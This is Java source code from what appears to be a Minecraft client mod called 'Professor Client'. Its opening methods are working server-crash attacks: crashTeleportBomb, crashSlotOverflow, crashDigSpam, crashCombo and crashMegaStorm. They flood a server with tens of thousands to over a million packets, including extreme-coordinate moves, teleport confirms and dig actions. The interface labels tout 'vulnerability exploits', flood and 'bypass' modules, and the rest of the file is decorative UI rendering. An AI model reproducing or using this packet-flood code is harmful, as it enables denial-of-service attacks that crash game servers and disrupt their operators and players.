        double x=px(),y=py(),z=pz(); float yw=yw(),pt=pt();
        double[] ys={1e7,-1e6,3e8,-5e5,1e9,-1e8};
        for (int i=0;i<50000;i++) sendMove(x,ys[i%ys.length],z,yw,pt,false);
        for (int i=0;i<10000;i++) { sendMove(x,y,z,yw,pt,true); sendMove(x,y+i*10000,z,yw,pt,false); }
        setStatus("[CRASH] Infinite Y -- 60K extreme pos!",0xFFFF2200);
    }
    private void crashChunkEdge() {
        if (notConn()) return;
        double x=px(),y=py(),z=pz(); float yw=yw(),pt=pt();
        double cx2=Math.floor(x/16)*16,cz2=Math.floor(z/16)*16;
        for (int i=0;i<15000;i++) { sendMove(cx2+(i%2==0?-0.5:16.5),y,cz2+(i%3==0?-0.5:i%3==1?16.5:8),yw,pt,true); }
        setStatus("[CRASH] Chunk Edge -- 15K border pkts!",0xFFFF6600);
    }
    private void crashTeleportBomb() {
        if (notConn()) return;
        double x=px(),y=py(),z=pz(); float yw=yw(),pt=pt();
        for (int i=0;i<65535;i++) client.player.networkHandler.sendPacket(new TeleportConfirmC2SPacket(i));
        for (int i=0;i<20000;i++) sendMove(x,y+i*0.001,z,yw,pt,false);
        setStatus("[CRASH] Teleport Bomb -- 85K pkts!",0xFFFF2200);
    }
    private void crashSlotOverflow() {
        if (notConn()) return;
        for (int i=0;i<50000;i++) client.player.networkHandler.sendPacket(new UpdateSelectedSlotC2SPacket(i%9));
        for (int i=0;i<20000;i++) client.player.networkHandler.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
        setStatus("[CRASH] Slot Overflow -- 70K pkts!",0xFFFF2200);
    }
    private void crashDigSpam() {
        if (notConn()) return;
        BlockPos bp=client.player.getBlockPos().down();
        for (int i=0;i<30000;i++) { client.player.networkHandler.sendPacket(new PlayerActionC2SPacket(PlayerActionC2SPacket.Action.START_DESTROY_BLOCK,bp,Direction.DOWN,i)); client.player.networkHandler.sendPacket(new PlayerActionC2SPacket(PlayerActionC2SPacket.Action.ABORT_DESTROY_BLOCK,bp,Direction.DOWN,i)); }
        setStatus("[CRASH] Dig Spam -- 60K action pkts!",0xFFFF6600);
    }
    private void crashCombo() {
        if (notConn()) return;
        double x=px(),y=py(),z=pz(); float yw=yw(),pt=pt(); boolean g=pg();
        for (int i=0;i<100000;i++) { sendMove(x,y+(i%9999)*0.0001,z,yw+(i%7),pt,false); if(i%3==0)client.player.networkHandler.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND)); if(i%5==0)client.player.networkHandler.sendPacket(new UpdateSelectedSlotC2SPacket(i%9)); if(i%7==0)client.player.networkHandler.sendPacket(new TeleportConfirmC2SPacket(i)); sendMove(x,y,z,yw,pt,g); }
        for (int i=0;i<50000;i++) { sendMove(x,i%2==0?1e8:-1e8,z,yw,pt,false); sendMove(x,y,z,yw,pt,true); }
        setStatus("[CRASH] COMBO -- 400K+ pkts!",0xFFFF0000);
    }
    private void crashMegaStorm() {
        if (notConn()) return;
        double x=px(),y=py(),z=pz(); float yw=yw(),pt=pt(); boolean g=pg();
        // Maximum possible load
        for (int pass=0;pass<3;pass++) {
            for (int i=0;i<200000;i++) { sendMove(x,y+(i%999)*0.0001,z,yw+(i%7),pt,false); sendMove(x,y,z,yw,pt,g); }
        }
        setStatus("[CRASH] !!! MEGA STORM -- 1.2M pkts !!!",0xFFFF0000);
    }

    // ══════════════════════════════════════════════════════════════════════
    //  HELPERS
    // ══════════════════════════════════════════════════════════════════════

    private void sendMove(double x,double y,double z,float yw,float pt,boolean g) {
        if (client!=null&&client.player!=null&&client.player.networkHandler!=null)
            client.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.Full(x,y,z,yw,pt,g));
    }
    private boolean notConn() {
        if (client==null||client.player==null){setStatus("Not connected to a server!",0xFFFF4444);return true;}return false;
    }
    private void setStatus(String m,int c){statusText=m;statusColor=c;statusTimer=260;}
    private double  px(){return client.player.getX();}
    private double  py(){return client.player.getY();}
    private double  pz(){return client.player.getZ();}
    private float   yw(){return client.player.getYaw();}
    private float   pt(){return client.player.getPitch();}
    private boolean pg(){return client.player.isOnGround();}

    // ══════════════════════════════════════════════════════════════════════
    //  TICK
    // ══════════════════════════════════════════════════════════════════════

    @Override
    public void tick() {
        super.tick();
        if (statusTimer>0) statusTimer--;
        tabAnim = Math.min(1f, tabAnim+0.1f);

        glowPulse += glowUp?0.035f:-0.035f;
        if      (glowPulse>=1f){glowPulse=1f;glowUp=false;}
        else if (glowPulse<=0f){glowPulse=0f;glowUp=true;}

        borderHue = (borderHue + 0.005f) % 1f;
        scanY  = (scanY  + 2.5f) % PH;
        scanY2 = (scanY2 + 1.6f) % PH;

        // Tab glow fade
        for (int i=0;i<NT;i++) {
            float target = i==tab ? 1f : 0f;
            tabGlow[i] += (target - tabGlow[i]) * 0.12f;
        }

        // Orb movement
        for (int i=0;i<ORBS;i++) {
            ox[i]+=ovx[i]; oy[i]+=ovy[i]; oph[i]+=0.025f;
            if(ox[i]<0||ox[i]>width) ovx[i]=-ovx[i];
            if(oy[i]<0||oy[i]>height) ovy[i]=-ovy[i];
        }
    }

    // ══════════════════════════════════════════════════════════════════════
    //  RENDER
    // ══════════════════════════════════════════════════════════════════════

    @Override
    public void render(DrawContext ctx, int mx, int my, float delta) {
        tick++;
        int W=width,H=height,cx=W/2,cy=H/2;
        int bpx=cx-PW/2,bpy=cy-PH/2;

        // === BACKGROUND ===
        ctx.fill(0,0,W,H,C_BG);
        drawGrid(ctx,W,H);
        drawOrbs(ctx,W,H);
        updateDataStreams(ctx,W,H);
        updateParticles(ctx,W,H);
        drawCenterGlow(ctx,cx,cy);

        // Mouse trail
        updateTrail(mx,my); drawTrail(ctx);

        // === PANEL ===
        ctx.fill(bpx+12,bpy+12,bpx+PW+12,bpy+PH+12,0x77000000); // shadow
        ctx.fill(bpx+6, bpy+6, bpx+PW+6, bpy+PH+6, 0x33000000); // soft shadow
        ctx.fill(bpx,bpy,bpx+PW,bpy+PH,C_PANEL);

        // === ANIMATED BORDER ===
        drawBorder(ctx,bpx,bpy);

        // === SCANLINES ===
        ctx.fill(bpx,bpy+(int)scanY,bpx+PW,bpy+(int)scanY+1,0x0CFFFFFF);
        ctx.fill(bpx,bpy+(int)scanY2,bpx+PW,bpy+(int)scanY2+1,0x07FFFFFF);

        // === TITLE AREA ===
        drawTitle(ctx,cx,bpy);

        // Cyan hairline divider
        int hsA=(int)(0x60*(0.7f+0.3f*glowPulse));
        ctx.fill(bpx+14,bpy+66,bpx+PW-14,bpy+67,(hsA<<24)|TAB_COLS[tab]);

        // Tab active indicator (colored underline glow)
        drawTabIndicators(ctx,bpx,bpy);

        // Active tab label
        float labA=0.65f+0.35f*glowPulse;
        ctx.drawText(textRenderer,"> "+TABS[tab].trim()+" <",bpx+18,bpy+69,(int)(labA*255)<<24|TAB_COLS[tab],false);

        // === TAB CONTENT TEXT ===
        int soff=(int)((1f-easeOut(tabAnim))*PW/2*tabDir);
        drawTabText(ctx,cx,bpy,bpx,soff);

        // === WIDGETS ===
        if (pktField!=null)  pktField.render(ctx,mx,my,delta);
        if (chatField!=null) chatField.render(ctx,mx,my,delta);
        if (cntField!=null)  cntField.render(ctx,mx,my,delta);
        super.render(ctx,mx,my,delta);

        // === UI ELEMENTS ===
        drawStatus(ctx,cx,bpx,bpy);
        drawMusicBar(ctx,bpx,bpy);
        drawCursorGlow(ctx,mx,my);
    }

    // ── Border drawing ────────────────────────────────────────────────────

    private void drawBorder(DrawContext ctx, int bpx, int bpy) {
        // Hue-cycling border
        float h = borderHue;
        int bR = (int)(Math.abs(Math.sin(h * 6.28f)) * 155 + (tab==5?100:0));
        int bG = Math.max(0,Math.min(255,(int)(180 + 75*Math.sin(h*6.28f+2.1))));
        int bB = Math.max(0,Math.min(255,(int)(240 + 15*Math.sin(h*6.28f+4.2))));
        int bA = (int)((0.65f+0.35f*glowPulse)*255);
        int bc = (bA<<24)|(bR<<16)|(bG<<8)|bB;
        int bc2 = ((bA/4)<<24)|(bR<<16)|(bG<<8)|bB;

        // Outer border
        ctx.fill(bpx,      bpy,       bpx+PW,   bpy+2,    bc);
        ctx.fill(bpx,      bpy+PH-2,  bpx+PW,   bpy+PH,   bc);
        ctx.fill(bpx,      bpy,       bpx+2,    bpy+PH,   bc);
        ctx.fill(bpx+PW-2, bpy,       bpx+PW,   bpy+PH,   bc);
        // Inner glow
        ctx.fill(bpx+2,    bpy+2,     bpx+PW-2, bpy+3,    bc2);
        ctx.fill(bpx+2,    bpy+PH-3,  bpx+PW-2, bpy+PH-2, bc2);
        ctx.fill(bpx+2,    bpy+2,     bpx+3,    bpy+PH-2, bc2);
        ctx.fill(bpx+PW-3, bpy+2,     bpx+PW-2, bpy+PH-2, bc2);

        // Gold corner brackets (bigger, more detailed)
        int gcA=(int)(0xEE*(0.7f+0.3f*glowPulse));
        int gc=(gcA<<24)|C_GOLD;
        int cs=20;
        // Top-left
        ctx.fill(bpx,    bpy,    bpx+cs, bpy+3,  gc); ctx.fill(bpx,   bpy,   bpx+3,  bpy+cs, gc);
        ctx.fill(bpx+3,  bpy+3,  bpx+8,  bpy+6,  (gcA/3<<24)|C_GOLD);
        // Top-right
        ctx.fill(bpx+PW-cs,bpy,  bpx+PW, bpy+3,  gc); ctx.fill(bpx+PW-3,bpy, bpx+PW, bpy+cs, gc);
        ctx.fill(bpx+PW-8,bpy+3, bpx+PW-3,bpy+6, (gcA/3<<24)|C_GOLD);
        // Bottom-left
        ctx.fill(bpx,    bpy+PH-3, bpx+cs, bpy+PH, gc); ctx.fill(bpx,   bpy+PH-cs, bpx+3,  bpy+PH, gc);
        // Bottom-right
        ctx.fill(bpx+PW-cs,bpy+PH-3,bpx+PW,bpy+PH, gc); ctx.fill(bpx+PW-3,bpy+PH-cs,bpx+PW,bpy+PH, gc);
    }

    // ── Tab indicators (glowing colored underlines) ───────────────────────

    private void drawTabIndicators(DrawContext ctx, int bpx, int bpy) {
        int tabW = (PW - 16) / NT;
        for (int i = 0; i < NT; i++) {
            float g = tabGlow[i];
            if (g < 0.01f) continue;
            int bx = bpx + 8 + i * (tabW + 1);
            int a  = (int)(g * 200);
            int c  = TAB_COLS[i];
            ctx.fill(bx,     bpy+60, bx+tabW, bpy+62, (a<<24)|c);
            ctx.fill(bx+2,   bpy+62, bx+tabW-2, bpy+63, (a/3<<24)|c);
            // Active tab glow background
            if (i == tab) {
                int ga = (int)(g * 18);
                ctx.fill(bx, bpy+44, bx+tabW, bpy+62, (ga<<24)|c);
            }
        }
    }

    // ── Title (enhanced) ──────────────────────────────────────────────────

    private void drawTitle(DrawContext ctx, int cx, int bpy) {
        // "PROFESSOR" pulsing in current tab color, "CLIENT" in gold
        String t1 = "PROFESSOR", t2 = " CLIENT";
        int tw1 = textRenderer.getWidth(t1), tw2 = textRenderer.getWidth(t2);
        int totalW = tw1 + tw2;
        int startX = cx - totalW/2;

        // Multi-layer glow for whole title
        int gA = (int)(28 + 22 * glowPulse);
        String full = t1 + t2;
        int ftw = textRenderer.getWidth(full);
        for (int dx=-5;dx<=5;dx++) {
            int g2=Math.max(0,gA-Math.abs(dx)*5);
            if (g2>0) {
                ctx.drawText(textRenderer,full,cx-ftw/2+dx,bpy+14,(g2<<24)|TAB_COLS[tab],false);
                ctx.drawText(textRenderer,full,cx-ftw/2,bpy+14+dx,(g2<<24)|TAB_COLS[tab],false);
            }
        }
        // Colored title
        float p=(float)((Math.sin(tick*0.05)+1.0)/2.0);
        int col1 = TAB_COLS[tab]; // tab-specific color
        int col2 = (int)(0xFF000000|(int)MathHelper.lerp(p,0xFFD700&0xFFFFFF,0x00F5FF));
        // can't easily lerp colors in int — just use gold for "CLIENT"
        ctx.drawText(textRenderer,t1,startX,bpy+14,0xFF000000|col1,false);
        ctx.drawText(textRenderer,t2,startX+tw1,bpy+14,0xFF000000|C_GOLD,false);

        // Subtitle
        String sub = "v3.0  |  6 Modules  |  8 Bypass Modes  |  Unlimited";
        int sA=(int)(110+70*glowPulse);
        ctx.drawText(textRenderer,sub,cx-textRenderer.getWidth(sub)/2,bpy+26,(sA<<24)|C_PURPLE,false);

        // Pulsing status dot
        String dot = (tick%20<10?"* ":"  ")+"ACTIVE"+(tick%30<15?"...".substring(0,2):".");
        int dotA=(int)(90+90*glowPulse);
        ctx.drawText(textRenderer,dot,cx-textRenderer.getWidth("* ACTIVE...")/2,bpy+38,(dotA<<24)|C_CYAN,false);

        // Unlimited indicator (when active)
        if (tab==0 && unlimitedMode) {
            String ul="!!! UNLIMITED MODE ACTIVE !!!";
            int ulA=(int)(180+75*glowPulse);
            // Blinking
            if (tick%16<10) ctx.drawText(textRenderer,ul,cx-textRenderer.getWidth(ul)/2,bpy+48,(ulA<<24)|C_RED,false);
        }
    }

    // ── Tab text labels ───────────────────────────────────────────────────

    private void drawTabText(DrawContext ctx, int cx, int bpy, int bpx, int soff) {
        switch (tab) {
            case 0 -> {
                ctx.drawText(textRenderer,"Packet Count:",cx-textRenderer.getWidth("Packet Count:")/2,bpy+82+soff,0x9900F5FF,false);
                ctx.drawText(textRenderer,"Presets:",cx-100,bpy+102+soff,0x7700AADD,false);
            }
            case 1 -> { String h=">> VULNERABILITY EXPLOITS <<"; ctx.drawText(textRenderer,h,cx-textRenderer.getWidth(h)/2,bpy+54,(int)(180+75*glowPulse)<<24|C_PURPLE,false); }
            case 2 -> { String h=">> COMBAT MODULES <<"; ctx.drawText(textRenderer,h,cx-textRenderer.getWidth(h)/2,bpy+54,0xFF003355,false); }
            case 3 -> { String h=">> MOVEMENT MODULES <<"; ctx.drawText(textRenderer,h,cx-textRenderer.getWidth(h)/2,bpy+54,0xFF003322,false); }
            case 4 -> {
                ctx.drawText(textRenderer,"Message:",bpx+14,bpy+77+soff,0x7700AADD,false);
                ctx.drawText(textRenderer,"Count:",bpx+14,bpy+97+soff,0x7700AADD,false);
            }
            case 5 -> {
                String h=">> CRASH MODULES <<";
                int hA=(int)(190+65*glowPulse);
                ctx.drawText(textRenderer,h,cx-textRenderer.getWidth(h)/2,bpy+50,(hA<<24)|C_RED,false);
            }
        }
        // Bypass description (FLOOD tab)
        if (tab==0) {
            String bd=BYPASS_DESC[bypassMode];
            ctx.drawText(textRenderer,bd,cx-textRenderer.getWidth(bd)/2,bpy+190,(int)(75+35*glowPulse)<<24|C_MUTED,false);
        }
    }

    // ── Background layers ─────────────────────────────────────────────────

    private void drawGrid(DrawContext ctx,int W,int H) {
        int col=0x05000000|C_CYAN;
        for(int x=0;x<W;x+=50)ctx.fill(x,0,x+1,H,col);
        for(int y=0;y<H;y+=50)ctx.fill(0,y,W,y+1,col);
        // Diagonal accent lines every few hundred px
        int da=(int)(0x04*(0.5f+0.5f*glowPulse));
        for(int x=0;x<W+H;x+=200)ctx.fill(x,0,x+1,H,(da<<24)|C_PURPLE);
    }

    private void drawOrbs(DrawContext ctx,int W,int H) {
        for (int i=0;i<ORBS;i++) {
            float tw=(MathHelper.sin(oph[i])+1f)/2f;
            int a=(int)(30*tw*(0.4f+0.3f*glowPulse));
            if(a<=0) continue;
            int sz=(int)osz[i];
            int c=switch(oct[i]){case 1->C_PURPLE;case 2->C_GOLD;default->C_CYAN;};
            ctx.fill((int)ox[i]-sz,(int)oy[i]-sz/2,(int)ox[i]+sz,(int)oy[i]+sz/2,(a<<24)|c);
        }
    }

    private void updateDataStreams(DrawContext ctx,int W,int H) {
        for(int i=0;i<80;i++){
            dsY[i]+=dsSp[i];
            if(dsY[i]>H+20){dsY[i]=-20;dsCh[i]=rng.nextInt(DS.length());}
            if(rng.nextInt(25)==0)dsCh[i]=rng.nextInt(DS.length());
            if(dsY[i]<0)continue;
            int hA=(int)(40+30*glowPulse);
            ctx.drawText(textRenderer,String.valueOf(DS.charAt(dsCh[i])),(int)dsX[i]-4,(int)dsY[i],(Math.min(255,hA*2)<<24)|C_CYAN,false);
            if(dsY[i]>14)ctx.drawText(textRenderer,String.valueOf(DS.charAt(dsCh[i])),(int)dsX[i]-4,(int)dsY[i]-14,(hA<<24)|C_MUTED,false);
        }
    }

    private void updateParticles(DrawContext ctx,int W,int H) {
        for(int i=0;i<PCNT;i++){
            ppx[i]+=pvx[i];ppy[i]+=pvy[i];pph[i]+=psp[i];
            if(ppy[i]<-10){ppy[i]=H+5;ppx[i]=rng.nextFloat()*W;}
            if(ppx[i]<0)ppx[i]=W;if(ppx[i]>W)ppx[i]=0;
            float tw=(MathHelper.sin(pph[i])+1f)/2f;
            int a=(int)(palp[i]*tw*220);if(a<8)continue;
            boolean big=psz[i]>2f;
            int col=switch(pct[i]){
                case 1->(a<<24)|(big?C_PURPLE:0x220033);
                case 2->(a<<24)|(big?C_GOLD  :0x443300);
                case 3->(a<<24)|(big?C_RED   :0x330000);
                case 4->(a<<24)|(big?C_GREEN :0x003311);
                default->(a<<24)|(big?C_CYAN :0x003344);
            };
            int sz=psz[i]>2.5f?2:1;
            ctx.fill((int)ppx[i],(int)ppy[i],(int)ppx[i]+sz,(int)ppy[i]+sz,col);
        }
    }

    private void drawCenterGlow(DrawContext ctx,int cx,int cy) {
        int[] r={330,240,160,90};int[] a={4,8,14,22};
        int gc = TAB_COLS[tab];
        for(int i=0;i<4;i++){int ra=r[i];int aa=(int)(a[i]*(0.5f+0.5f*glowPulse));ctx.fill(cx-ra,cy-ra/2,cx+ra,cy+ra/2,(aa<<24)|gc);}
    }

    // ── Mouse trail & cursor ──────────────────────────────────────────────

    private void updateTrail(int mx,int my){
        trail.addFirst(new int[]{mx,my,0});
        if(trail.size()>24)trail.removeLast();
        for(int[] p:trail)p[2]++;
    }

    private void drawTrail(DrawContext ctx){
        int i=0;
        for(int[] p:trail){
            int age=p[2];if(age==0)continue;
            int a=Math.max(0,220-age*10);if(a<=0)continue;
            int r=3+age/3;
            // Trail cycles through tab color -> purple
            int col=age<8?(a<<24)|TAB_COLS[tab]:(a<<24)|C_PURPLE;
            ctx.fill(p[0]-r,p[1]-1,p[0]+r,p[1]+1,col);
            ctx.fill(p[0]-1,p[1]-r,p[0]+1,p[1]+r,col);
            i++;
        }
    }

    private void drawCursorGlow(DrawContext ctx,int mx,int my){
        int tabC=TAB_COLS[tab];
        int[] rad={28,16,7};int[] alp={9,24,60};
        for(int i=0;i<3;i++){int r=rad[i];int a=(int)(alp[i]*(0.65f+0.35f*glowPulse));
            ctx.fill(mx-r,my-1,mx+r,my+1,(a<<24)|tabC);ctx.fill(mx-1,my-r,mx+1,my+r,(a<<24)|tabC);}
        ctx.fill(mx-2,my-2,mx+2,my+2,0xCC000000|tabC);
    }

    // ── Status bar ────────────────────────────────────────────────────────

    private void drawStatus(DrawContext ctx,int cx,int bpx,int bpy){
        if(statusTimer<=0||statusText.isEmpty())return;
        int a=Math.min(255,statusTimer*2);
        int col=(statusColor&0x00FFFFFF)|(a<<24);
        ctx.fill(bpx+6,bpy+PH-26,bpx+PW-6,bpy+PH-6,0x99000000);
        ctx.fill(bpx+6,bpy+PH-26,bpx+9,bpy+PH-6,(a<<24)|C_GOLD);
        ctx.fill(bpx+PW-9,bpy+PH-26,bpx+PW-6,bpy+PH-6,(a<<24)|C_GOLD);
        ctx.fill(bpx+6,bpy+PH-28,bpx+PW-6,bpy+PH-26,(a/4<<24)|C_GOLD);
        ctx.drawText(textRenderer,statusText,cx-textRenderer.getWidth(statusText)/2,bpy+PH-19,col,false);
    }

    // ── Music bar ─────────────────────────────────────────────────────────

    private void drawMusicBar(DrawContext ctx,int bpx,int bpy){
        boolean playing=ProfessorMusicManager.isPlaying(client);
        float prog=ProfessorMusicManager.getVisualProgress();
        int barX=bpx+12,barY=bpy+PH-42,barW=PW-24,barH=4;

        ctx.fill(barX,barY,barX+barW,barY+barH,0x220000FF);
        int fillW=(int)(barW*prog);
        if(fillW>0){
            for(int xi=0;xi<fillW;xi++){float frac=(float)xi/barW;
                int r2=(int)(frac*155),g2=Math.max(0,(int)(245-245*frac));
                ctx.fill(barX+xi,barY,barX+xi+1,barY+barH,0xFF000000|(r2<<16)|(g2<<8)|255);}
            // Cap glow
            int gcA=(int)(90*glowPulse);
            ctx.fill(barX+fillW-4,barY-2,barX+fillW+2,barY+barH+2,(gcA<<24)|C_CYAN);
        }

        // Equalizer bars (decorative)
        for(int i=0;i<20;i++){
            float h=(float)((Math.sin(tick*0.15+i*0.6)+1)/2)*barH*2+1;
            int ba=(int)(50+40*glowPulse);
            int bc=i<7?(ba<<24)|C_PURPLE:i<14?(ba<<24)|C_CYAN:(ba<<24)|C_GOLD;
            ctx.fill(barX+barW+4+i*3,barY-1,(int)(barX+barW+4+i*3+2),(int)(barY+barH+h),bc);
        }

        String lbl=playing?"+ MUSIC  PLAYING":"+ MUSIC  OFF";
        int lA=(int)(80+50*glowPulse);
        ctx.drawText(textRenderer,lbl,barX,barY-9,(lA<<24)|(playing?C_CYAN:C_MUTED),false);

        // Track name
        String track="> EPIC THEME (Pigstep)";
        int tA=(int)(55+30*glowPulse);
        ctx.drawText(textRenderer,track,barX+textRenderer.getWidth(lbl)+10,barY-9,(tA<<24)|C_MUTED,false);
    }

    // ── Utility ───────────────────────────────────────────────────────────
    private float easeOut(float t){return 1f-(1f-t)*(1f-t);}

    // ── Input ─────────────────────────────────────────────────────────────
    @Override public boolean keyPressed(int kc,int sc,int m){
        if(pktField !=null&&pktField.isFocused() &&pktField.keyPressed(kc,sc,m)) return true;
        if(chatField!=null&&chatField.isFocused()&&chatField.keyPressed(kc,sc,m))return true;
        if(cntField !=null&&cntField.isFocused() &&cntField.keyPressed(kc,sc,m)) return true;
        return super.keyPressed(kc,sc,m);
    }
    @Override public boolean charTyped(char c,int m){
        if(pktField !=null&&pktField.isFocused())  return pktField.charTyped(c,m);
        if(chatField!=null&&chatField.isFocused()) return chatField.charTyped(c,m);
        if(cntField !=null&&cntField.isFocused())  return cntField.charTyped(c,m);
        return super.charTyped(c,m);
    }
    @Override public boolean mouseClicked(double mx,double my,int b){
        if(pktField !=null)pktField.mouseClicked(mx,my,b);
        if(chatField!=null)chatField.mouseClicked(mx,my,b);
        if(cntField !=null)cntField.mouseClicked(mx,my,b);
        return super.mouseClicked(mx,my,b);
    }

    @Override public boolean shouldPause()      {return false;}
    @Override public boolean shouldCloseOnEsc() {return true;}
}
